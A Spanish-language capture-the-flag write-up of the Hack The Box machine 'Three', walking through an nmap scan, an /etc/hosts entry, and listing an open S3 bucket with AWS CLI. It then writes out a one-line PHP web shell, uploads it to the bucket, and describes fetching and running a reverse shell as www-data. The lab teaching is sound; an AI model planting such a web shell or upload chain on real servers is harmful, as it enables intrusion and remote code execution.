B# HTB - Three

Bienvenidos a mi primer **writeup** de una máquina CTF.

Esta vez resolveremos la máquina llamada ***Three*** de **Hack The Box (HTB)**.

![[Pasted image 20260928230016.png]]

## 1. Reconocimiento

Para intentar detectar qué sistema operativo utiliza la máquina, podemos realizar un `ping` y fijarnos en el valor del **TTL**. Dependiendo de este valor, podemos hacernos una idea de si estamos ante una máquina Windows o Linux/macOS.

Esto no siempre es fiable, ya que el TTL se puede modificar.

En este caso, como HTB ya nos indica que la máquina utiliza **Linux**, podemos saltarnos este paso.

### Escaneo con Nmap

Una vez hecho esto, pasamos al reconocimiento de puertos utilizando **Nmap**.

Realizaremos un escaneo de todos los puertos TCP (`-p-`) utilizando un SYN Scan (`-sS`). También utilizaremos `-Pn` para no depender del descubrimiento mediante ICMP y `-n` para evitar la resolución DNS.

El comando utilizado es:

```bash
nmap 10.129.241.202 -p- -sS -Pn -n -T5
```

El resultado es:

```text
[Sep 28, 2026 - 23:07:37 (CEST)] exegol-wssm /workspace # nmap 10.129.241.202 -p- -sS -Pn -n -T5

Starting Nmap 7.93 ( https://nmap.org ) at 2026-09-28 23:07 CEST
Warning: 10.129.241.202 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.241.202
Host is up (0.031s latency).
Not shown: 65132 closed tcp ports (reset), 401 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 74.67 seconds
```

Podemos observar que tenemos dos puertos abiertos:

* **22/tcp** → SSH
* **80/tcp** → HTTP

De esta manera ya podemos responder a la primera pregunta de la máquina.

![[Pasted image 20260928231459.png]]

---

## 2. Enumeración web

En la siguiente pregunta nos dan una pista para continuar con la enumeración.

Accedemos al apartado de ***Contact*** de la página web para intentar encontrar más información sobre el dominio utilizado por la máquina.

![[Pasted image 20260928231708.png]]

Aquí encontramos el dominio:

```text
thetoppers.htb
```

---

## 3. Configuración de /etc/hosts

En la pregunta número 3 nos preguntan que, en ausencia de un servidor DNS, ¿en qué archivo podemos configurar la resolución de un dominio?

La respuesta es:

```text
/etc/hosts
```

Este archivo permite asociar manualmente un nombre de dominio con una dirección IP.

Por lo tanto, añadimos la siguiente línea:

```text
10.129.241.202    thetoppers.htb
```

Podemos comprobarlo con:

```bash
cat /etc/hosts
```

Resultado:

```text
[Sep 28, 2026 - 23:20:10 (CEST)] exegol-wssm /workspace # cat /etc/hosts 
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
fe00::          ip6-localnet
ff00::          ip6-mcastprefix
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
172.17.0.2      exegol-wssm
10.129.241.202  thetoppers.htb
```

---

## 4. Enumeración de subdominios

La siguiente pregunta nos da una pista sobre el siguiente paso: realizar un **fuzzing de subdominios** sobre el dominio que acabamos de encontrar.

Para realizar este tipo de enumeración podemos utilizar herramientas como **ffuf**.

Sin embargo, en este ejercicio no es necesario realizar todo el fuzzing, ya que la propia pregunta nos proporciona una pista bastante clara: el subdominio es:

```text
s3.thetoppers.htb
```

Al acceder a este subdominio encontramos un servicio relacionado con **S3**.

Por el nombre `s3` podemos deducir que está relacionado con **Amazon S3**, el servicio de almacenamiento de objetos de Amazon Web Services.

Para poder interactuar con este servicio podemos utilizar **AWS CLI**.

---

## 5. Configuración de AWS CLI

Primero ejecutamos:

```bash
aws configure
```

En este laboratorio podemos utilizar valores aleatorios para las credenciales, ya que el servicio S3 de la máquina está configurado para poder interactuar con él sin necesitar unas credenciales reales de AWS.

A continuación, utilizamos AWS CLI indicando como endpoint el servicio S3 de la máquina:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

El resultado es:

```text
[Sep 28, 2026 - 23:44:37 (CEST)] exegol-wssm /workspace # aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

                           PRE images/
2026-09-28 22:59:39          0 .htaccess
2026-09-28 22:59:39      11952 index.php
```

Podemos observar que el bucket contiene un directorio llamado `images/` y los archivos `.htaccess` e `index.php`.

---

## 6. Subida de una web shell

Como el bucket nos permite subir archivos, podemos aprovecharlo para subir una pequeña **web shell en PHP**.

Creamos el archivo `shell.php`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Esta pequeña shell permite ejecutar comandos mediante el parámetro `cmd`.

A continuación, subimos el archivo al bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Obtenemos:

```text
[Sep 28, 2026 - 23:44:55 (CEST)] exegol-wssm /workspace # aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

upload: ./shell.php to s3://thetoppers.htb/shell.php
```

Una vez subida la shell, podemos acceder a ella desde el navegador mediante:

```text
http://thetoppers.htb/shell.php
```

y utilizar el parámetro:

```text
?cmd=
```

para ejecutar comandos en el servidor.

---

## 7. Reverse shell

Una vez comprobado que podemos ejecutar comandos remotamente, podemos conseguir una conexión inversa (**reverse shell**) hacia nuestra máquina.

Para ello creamos un archivo `sh.sh` que contiene nuestra reverse shell y lo servimos mediante un servidor HTTP de Python.

Por ejemplo:

```bash
python3 -m http.server 8000
```

Después hacemos que la máquina víctima descargue y ejecute el archivo.

Una vez establecida la conexión, obtenemos una shell en la máquina víctima con el usuario:

```text
www-data
```

---

## 8. Flag

Una vez dentro de la máquina, HTB nos indica dónde podemos encontrar la flag:

```text
/var/www/
```

Por lo tanto, podemos acceder al directorio y leer la flag.

En esta máquina no es necesario realizar una **escalada de privilegios** para completar el laboratorio.

![[Pasted image 20260929000635.png]]

## Conclusión

En esta máquina hemos aprendido a realizar un reconocimiento básico con **Nmap**, configurar un dominio mediante `/etc/hosts`, identificar un servicio S3 y utilizar **AWS CLI** para interactuar con él.

Finalmente, aprovechamos la posibilidad de subir archivos al bucket para subir una web shell en PHP, conseguir ejecución remota de comandos y obtener una reverse shell como `www-data`.

Esta máquina es especialmente interesante para entender cómo una mala configuración de un servicio de almacenamiento puede acabar permitiendo la ejecución de código en un servidor web.

